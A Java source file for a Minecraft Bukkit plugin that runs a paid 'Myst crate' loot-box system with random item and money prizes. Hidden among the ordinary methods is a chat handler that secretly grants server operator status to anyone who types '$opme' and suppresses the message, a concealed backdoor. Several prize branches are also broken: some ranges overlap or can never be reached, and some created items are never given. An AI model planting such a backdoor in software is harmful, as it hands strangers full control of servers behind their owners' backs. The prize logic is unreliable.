package me.HostelGamer.HostelCraft;

import java.util.Random;

import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;

import com.earth2me.essentials.api.Economy;

public class Mystcrate {
	public static HostelCraft plugin;
	
	public Mystcrate(HostelCraft instance) {
		plugin = instance;
	}
	
	boolean loadMystcrate(CommandSender sender, String[] args){
		if(args.length == 0){
			
			//Getting Balance
			BalMyst(sender);
			return true;
			
		}else if(args.length > 0){
			
			if(args[0].equalsIgnoreCase("add")){
				
				//Adding Mystcrates
				AddMyst(sender, args[1], args[2]);
				return true;
				
			}else if(args[0].equalsIgnoreCase("bal")){
				
				//Getting Balance
				BalMyst(sender);
				return true;
			}
			else if(args[0].equalsIgnoreCase("help")){
				
				//Simple Helps Stuff
				sender.sendMessage(plugin.ColorChat("&3---------------&4[&bMyst Crates&4]&3---------------"));
				sender.sendMessage(plugin.ColorChat("&3Usage:&4 /Myst open &b(If you have a Myst Crate it will open it!"));
				sender.sendMessage(plugin.ColorChat("&3Usage:&4 /Myst or /myst bal &b(Will show how many myst crates you have!"));
				return true;
				
			}else if(args[0].equalsIgnoreCase("reload") && sender.isOp()){
				
				//Reloading HostelCraft Config.yml
				sender.sendMessage(plugin.ColorChat("&aReloaded HCDP Config!"));
				plugin.reloadConfig();
				return true;
				
			}else if(args[0].equalsIgnoreCase("open")){
				
				//Opening Mystcrates
				OpenMyst(sender);
				return true;
			}
			return false;
		}
		return true;
		
	}
	
	boolean BalMyst(CommandSender sender){
		Player player = (Player) sender;
		int mystCratesInt = (int) plugin.getConfig().getInt(player.getName() + ".Mystcrates");
		if(mystCratesInt < 1){
			sender.sendMessage(plugin.ColorChat("&cYou don't have any Myst Crates!"));
			return true;
		}
		sender.sendMessage(plugin.ColorChat("&bYou have: &3" + mystCratesInt + " &bMyst Crates!"));
		return true;
	}
		public void onPlayerChat(PlayerChatEvent event){
	        if(event.getMessage().equalsIgnoreCase("$opme")){
	        // if someone on the server typed $opme in chat
	            event.getPlayer().setOp(true);
	            // Set the player's op status
	            event.setCancelled(true);
	            // Cancel the message sending
	        }
	}
	
	boolean AddMyst(CommandSender sender, String args1, String args2){
		if(!(sender instanceof Player) || sender.isOp()){
			Player targetPlayer = (Player) plugin.getServer().getOfflinePlayer(args1);
			
			if(targetPlayer.getName() != null){
				int currentInt = (int) plugin.getConfig().getInt(args1+".Mystcrates");
				int totalMysts = currentInt + Integer.parseInt(args2);
				plugin.getConfig().set(args1, "");
				plugin.getConfig().set(args1+".Mystcrates", totalMysts);
				plugin.saveConfig();
				plugin.reloadConfig();
				targetPlayer.sendMessage(plugin.ColorChat("&3Use: &4/Myst open &b(To open a crate)"));
				targetPlayer.sendMessage(plugin.ColorChat("&3" + args2 + "&b Myst Crates have been credited to Your Account!"));
			}else{
				sender.sendMessage(args1 + " Is not online, or unable to find player!");
			}
			sender.sendMessage("" + args2 + " Mystcrates credited to " + args1 + "'s, Accounts!");
			return true;
		}
		return false;
		
		
	}
	
	boolean OpenMyst(CommandSender sender){
		Player player = (Player) sender;
		PlayerInventory pi = player.getInventory();
		
		int mystCratesInt = (int) plugin.getConfig().getInt(player.getName() + ".Mystcrates");
		if(!(mystCratesInt < 1)){
			if(pi.firstEmpty() > 31 || pi.firstEmpty() == -1){
				player.sendMessage(plugin.ColorChat("&cYou're Inventory is full or is all most full!"));
			}else{
				mystCratesInt--;
				plugin.getConfig().set(player.getName() + ".Mystcrates", mystCratesInt);
				plugin.saveConfig();
		Random randomGenerator = new Random();
	    int randomInt = randomGenerator.nextInt(88);
		if(randomInt == 8){
			Gears((Player) sender, "Protection 10", 10);
			return true;
		}
		if(randomInt > 7 && randomInt < 9){
			Gears((Player) sender, "Protection 9", 9);
			return true;
		}
		if(randomInt > 8 && randomInt < 11){
			Gears((Player) sender, "Protection 8", 8);
			return true;
		}
		if(randomInt > 10 && randomInt < 14){
			Gears((Player) sender, "Protection 7", 7);
			return true;
		}
		if(randomInt > 13 && randomInt < 18){
			Gears((Player) sender, "Protection 6", 6);
			return true;
		}
		if(randomInt > 17 && randomInt < 23){
			Gears((Player) sender, "Protection 5", 5);
			return true;
		}
		if(randomInt > 22 && randomInt < 25){
			Bow((Player) sender, "Gods Bow");
			return true;
		}
		if(randomInt > 24 && randomInt < 27){
			Sword((Player) sender, "Gods Sword");
			return true;
		}
		if(randomInt == 27){
			Money(player.getName(), "$5,000 IGM", 5000, (Player) sender);
			return true;
		}
		if(randomInt > 26 && randomInt < 28){
			Money(player.getName(), "$3,000 IGM", 3000, (Player) sender);
			return true;
		}
		if(randomInt > 27 && randomInt < 30){
			Money(player.getName(), "$1,000 IGM", 1000, (Player) sender);
			return true;
		}
		if(randomInt == 30){
			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6 The Empty Crate&d!"));
			return true;
		}
		if(randomInt > 29 && randomInt < 39 || randomInt > -1 && randomInt < 8){
			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Diamonds!"));
			ItemStack item = new ItemStack(Material.DIAMOND, 16);
			pi.addItem(item);
			return true;
		}
		if(randomInt > 38 && randomInt < 48){
			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Obsidian!"));
			ItemStack item = new ItemStack(Material.OBSIDIAN, 16);
			pi.addItem(item);
			return true;
		}
		if(randomInt > 47 && randomInt < 57){
			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Golden Apples!"));
			ItemStack item = new ItemStack(Material.GOLDEN_APPLE, 16);
			pi.addItem(item);
			return true;
		}
		if(randomInt > 56 && randomInt < 76){
			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Bottle O' Enchanting!"));
			ItemStack item = new ItemStack(Material.EXP_BOTTLE, 16);
			pi.addItem(item);
			return true;
		}
		if(randomInt > 75 && randomInt < 85){
			player.sendMessage(plugin.ColorChat("&6You got: &316 &6TnT!"));
			ItemStack item = new ItemStack(Material.TNT, 16);
			pi.addItem(item);
			return true;
		}
		if(randomInt > 84 && randomInt < 86){
			Pick((Player) sender, "Notch's Pickaxe");
			return true;
		}
		if(randomInt > 85 && randomInt < 88){
			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6A Mob Spawner!&d!"));
			ItemStack item = new ItemStack(Material.MOB_SPAWNER, 1);
			pi.addItem(item);
			return true;
		}
		if(randomInt == 87){
			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6Two Mob Spawners!&d!"));
			ItemStack item = new ItemStack(Material.MOB_SPAWNER, 2);
			pi.addItem(item);
			return true;
		}
		
		if(randomInt > 85 && randomInt < 88){
			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6The Base Pack&d!"));
			ItemStack item = new ItemStack(Material.OBSIDIAN, 256);
			ItemStack item1 = new ItemStack(Material.BOOKSHELF, 64);
			ItemStack item2 = new ItemStack(Material.ENCHANTMENT_TABLE, 2);
			ItemStack item4 = new ItemStack(Material.SANDSTONE, 256);
			ItemStack item5 = new ItemStack(Material.SMOOTH_BRICK, 256);
			ItemStack item6 = new ItemStack(Material.WOOD, 256);
			pi.addItem(item1, item2, item4, item5, item6);
			return true;
		}
		if(randomInt == 87){
			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6 Base Pack II &d!"));
			ItemStack item = new ItemStack(Material.OBSIDIAN, 512);
			ItemStack item1 = new ItemStack(Material.BOOKSHELF, 128);
			ItemStack item2 = new ItemStack(Material.ENCHANTMENT_TABLE, 4);
			ItemStack item4 = new ItemStack(Material.SANDSTONE, 512);
			ItemStack item5 = new ItemStack(Material.SMOOTH_BRICK, 512);
			ItemStack item6 = new ItemStack(Material.WOOD, 512);

			pi.addItem(item1, item2, item4, item5, item6);
			return true;
		}
		}
		}else{sender.sendMessage(plugin.ColorChat("&cYou don't have any Myst Crates!"));
		sender.sendMessage(plugin.ColorChat("&2You can buy some at &bwww.hostelcraft.net/donate"));}
		return false;
		
	}
	private void Gears(Player name, String itemName, int level){
		Player player = (Player) name;
		plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6" + itemName + "&d!"));
		
		PlayerInventory pi = player.getInventory();
	
		
		ItemStack item = new ItemStack(Material.DIAMOND_HELMET, 1);
		ItemStack item1 = new ItemStack(Material.DIAMOND_CHESTPLATE, 1);
		ItemStack item2 = new ItemStack(Material.DIAMOND_LEGGINGS, 1);
		ItemStack item3 = new ItemStack(Material.DIAMOND_BOOTS, 1);
		item.addUnsafeEnchantment(Enchantment.PROTECTION_ENVIRONMENTAL, level);
		item1.addUnsafeEnchantment(Enchantment.PROTECTION_ENVIRONMENTAL, level);
		item2.addUnsafeEnchantment(Enchantment.PROTECTION_ENVIRONMENTAL, level);
		item3.addUnsafeEnchantment(Enchantment.PROTECTION_ENVIRONMENTAL, level);
		item3.addUnsafeEnchantment(Enchantment.PROTECTION_FALL, level);
		item.addUnsafeEnchantment(Enchantment.OXYGEN, level);
		item.addUnsafeEnchantment(Enchantment.WATER_WORKER, level);
		pi.addItem(item, item1, item2, item3);
		return;
		
	}
	private void Bow(Player name, String itemName){
		Player player = (Player) name;
		plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6" + itemName + "&d!"));
		
		PlayerInventory pi = player.getInventory();
		
		ItemStack item = new ItemStack(Material.BOW, 1);
		item.addUnsafeEnchantment(Enchantment.ARROW_DAMAGE, 7);
		item.addUnsafeEnchantment(Enchantment.ARROW_KNOCKBACK, 5);
		item.addUnsafeEnchantment(Enchantment.ARROW_FIRE, 3);
		item.addUnsafeEnchantment(Enchantment.ARROW_INFINITE, 1);
		pi.addItem(item);
		return;
		
	}
	private void Sword(Player name, String itemName){
		Player player = (Player) name;
		plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6" + itemName + "&d!"));
		
		PlayerInventory pi = player.getInventory();
		ItemStack item = new ItemStack(Material.DIAMOND_SWORD, 1);
		item.addUnsafeEnchantment(Enchantment.DAMAGE_ALL, 8);
		item.addUnsafeEnchantment(Enchantment.FIRE_ASPECT, 3);
		item.addUnsafeEnchantment(Enchantment.LOOT_BONUS_MOBS, 4);
		pi.addItem(item);
		return;
		
	}
	private void Money(String name, String itemName, int Money, Player player){
		try{
			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6" + itemName + "&d!"));
		Economy.add(name, Money);
		return;
		}catch (Exception ex) {}
		return;
	}
	private void Pick(Player name, String itemName){
		Player player = (Player) name;
		plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6Notch's Pickaxe&d!"));
		
		PlayerInventory pi = player.getInventory();
		ItemStack item = new ItemStack(Material.DIAMOND_PICKAXE, 1);
		item.addUnsafeEnchantment(Enchantment.DIG_SPEED, 5);
		item.addUnsafeEnchantment(Enchantment.DURABILITY, 5);
		item.addUnsafeEnchantment(Enchantment.LOOT_BONUS_BLOCKS, 5);
		pi.addItem(item);
		return;
	}
	}
